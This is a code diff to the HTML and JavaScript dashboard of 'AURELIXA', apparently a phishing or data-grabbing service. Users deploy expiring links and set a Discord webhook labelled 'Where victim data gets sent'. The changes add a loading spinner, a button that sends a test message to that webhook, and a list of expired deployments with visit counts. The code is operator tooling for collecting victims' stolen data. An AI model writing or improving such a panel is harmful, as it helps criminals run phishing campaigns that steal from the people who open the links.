@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Dashboard - AURELIXA</title>
+    <link rel="icon" type="image/png" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⚡</text></svg>">
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
         body{background:#0a0e1a;color:#c8d6e5;font-family:'Segoe UI',sans-serif;padding:20px;min-height:100vh}
@@ -26,6 +27,9 @@
         .btn-deploy:hover{background:#6ab0ff;transform:scale(1.01)}
         .btn-deploy:disabled{opacity:0.4;cursor:not-allowed}
         .deploy-status{color:#6a8aaa;margin-top:10px;font-size:0.9rem;text-align:center}
+        .spinner{display:none;width:40px;height:40px;margin:10px auto;border:4px solid #1a2a4a;border-top:4px solid #4a9eff;border-radius:50%;animation:spin 0.8s linear infinite}
+        .spinner.show{display:block}
+        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
         .section{background:#111b2e;border-radius:12px;padding:25px;margin-top:25px;border:1px solid #1a2a4a}
         .section h2{color:#4a9eff;font-size:1.2rem;margin-bottom:15px}
         .section label{color:#6a8aaa;display:block;margin-bottom:5px;font-size:0.9rem}
@@ -33,6 +37,8 @@
         .section input:focus{outline:none;border-color:#4a9eff}
         .section .btn-small{background:#4a9eff;color:#0a0e1a;border:none;padding:10px 25px;border-radius:8px;cursor:pointer;margin-top:10px;font-weight:600;transition:0.3s}
         .section .btn-small:hover{background:#6ab0ff}
+        .section .btn-test{background:#2a2a4a;color:#4a9eff;border:1px solid #4a9eff;padding:10px 25px;border-radius:8px;cursor:pointer;margin-top:10px;font-weight:600;transition:0.3s;margin-left:10px}
+        .section .btn-test:hover{background:#1a2a4a}
         .deployment-item{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid #0d1a2a;flex-wrap:wrap;gap:10px}
         .deployment-item .url{color:#4a9eff;font-weight:600}
         .deployment-item .status{font-size:0.8rem;font-weight:600}
@@ -71,20 +77,32 @@
         </div>
 
         <button class="btn-deploy" id="deployBtn">⚡ DEPLOY NEW LINK</button>
+        <div id="deploySpinner" class="spinner"></div>
         <div id="deployStatus" class="deploy-status"></div>
 
         <div class="section">
             <h2>🔗 Your Discord Webhook</h2>
             <label>Where victim data gets sent</label>
-            <input type="text" id="webhookInput" placeholder="https://discord.com/api/webhooks/...">
-            <button class="btn-small" id="saveWebhookBtn">Save Webhook</button>
+            <div style="display:flex;flex-wrap:wrap;gap:10px;align-items:center;">
+                <input type="text" id="webhookInput" placeholder="https://discord.com/api/webhooks/..." style="flex:1;min-width:200px;">
+                <button class="btn-small" id="saveWebhookBtn">Save</button>
+                <button class="btn-test" id="testWebhookBtn">🔔 Test</button>
+            </div>
             <div id="webhookStatus" style="color:#6a8aaa;margin-top:5px;font-size:0.85rem;"></div>
+            <div id="webhookTestResult" style="color:#6a8aaa;margin-top:5px;font-size:0.85rem;"></div>
         </div>
 
         <div class="section">
             <h2>📋 Your Active Links</h2>
             <div id="deploymentList">
                 <div class="empty">No active links</div>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>📜 Deployment History</h2>
+            <div id="historyList">
+                <div class="empty">No history yet</div>
             </div>
         </div>
 
@@ -113,6 +131,7 @@
                 document.getElementById('userPlan').className = 'plan-badge ' + user.plan;
                 if (user.webhook) document.getElementById('webhookInput').value = user.webhook;
                 loadDeployments();
+                loadHistory();
                 loadStats();
             } catch (e) {
                 localStorage.removeItem('token');
@@ -152,6 +171,40 @@
             } catch (e) { console.error(e); }
         }
 
+        async function loadHistory() {
+            try {
+                const res = await fetch(API_URL + '/api/deploy/my', {
+                    headers: { 'Authorization': 'Bearer ' + token }
+                });
+                const data = await res.json();
+                const list = document.getElementById('historyList');
+                if (!data.deployments || data.deployments.length === 0) {
+                    list.innerHTML = '<div class="empty">No history yet</div>';
+                    return;
+                }
+                const history = data.deployments.filter(d => new Date(d.expiresAt) <= new Date() || !d.active);
+                if (history.length === 0) {
+                    list.innerHTML = '<div class="empty">No history yet</div>';
+                    return;
+                }
+                let html = '';
+                history.slice(0, 10).forEach(d => {
+                    const date = new Date(d.createdAt).toLocaleDateString();
+                    html += `
+                        <div class="deployment-item">
+                            <span class="url" style="color:#6a8aaa;">${d.url}</span>
+                            <span>
+                                <span class="status expired">🔴 EXPIRED</span>
+                                <span style="color:#4a5a6a;font-size:0.8rem;margin-left:10px;">${date}</span>
+                                <span style="color:#4a5a6a;font-size:0.8rem;margin-left:10px;">${d.visits || 0} visits</span>
+                            </span>
+                        </div>
+                    `;
+                });
+                list.innerHTML = html;
+            } catch (e) { console.error(e); }
+        }
+
         async function loadStats() {
             try {
                 const res = await fetch(API_URL + '/api/deploy/my', {
@@ -180,8 +233,10 @@
         document.getElementById('deployBtn').addEventListener('click', async () => {
             const btn = document.getElementById('deployBtn');
             const status = document.getElementById('deployStatus');
+            const spinner = document.getElementById('deploySpinner');
             btn.disabled = true;
             btn.textContent = '⏳ DEPLOYING...';
+            spinner.classList.add('show');
             status.textContent = '';
             try {
                 const res = await fetch(API_URL + '/api/deploy/new', {
@@ -189,6 +244,7 @@
                     headers: { 'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json' }
                 });
                 const data = await res.json();
+                spinner.classList.remove('show');
                 if (!res.ok) {
                     status.textContent = '❌ ' + (data.error || 'Something went wrong');
                     status.style.color = '#ff4757';
@@ -201,8 +257,10 @@
                 navigator.clipboard.writeText(data.url);
                 status.textContent += ' 📋 Copied!';
                 loadDeployments();
+                loadHistory();
                 loadStats();
             } catch (e) {
+                spinner.classList.remove('show');
                 status.textContent = '❌ Network error';
                 status.style.color = '#ff4757';
             }
@@ -238,6 +296,44 @@
             }
         });
 
+        document.getElementById('testWebhookBtn').addEventListener('click', async () => {
+            const webhook = document.getElementById('webhookInput').value.trim();
+            const result = document.getElementById('webhookTestResult');
+            if (!webhook || !webhook.includes('discord.com/api/webhooks')) {
+                result.textContent = '❌ Invalid webhook URL';
+                result.style.color = '#ff4757';
+                return;
+            }
+            result.textContent = '⏳ Sending test message...';
+            result.style.color = '#6a8aaa';
+            try {
+                const res = await fetch(webhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: '✅ **Webhook test successful!**',
+                        embeds: [{
+                            title: '🔔 Test Notification',
+                            description: 'Your Discord webhook is working correctly!',
+                            color: 0x4a9eff,
+                            footer: { text: 'Aurelixa Platform' },
+                            timestamp: new Date().toISOString()
+                        }]
+                    })
+                });
+                if (res.ok) {
+                    result.textContent = '✅ Test message sent to Discord!';
+                    result.style.color = '#4eff6a';
+                } else {
+                    result.textContent = '❌ Failed to send test message. Check webhook URL.';
+                    result.style.color = '#ff4757';
+                }
+            } catch (e) {
+                result.textContent = '❌ Network error. Could not reach Discord.';
+                result.style.color = '#ff4757';
+            }
+        });
+
         window.deleteDeploy = async (subdomain) => {
             if (!confirm('Delete this deployment?')) return;
             try {
@@ -246,6 +342,7 @@
                     headers: { 'Authorization': 'Bearer ' + token }
                 });
                 loadDeployments();
+                loadHistory();
                 loadStats();
             } catch (e) { console.error(e); }
         };
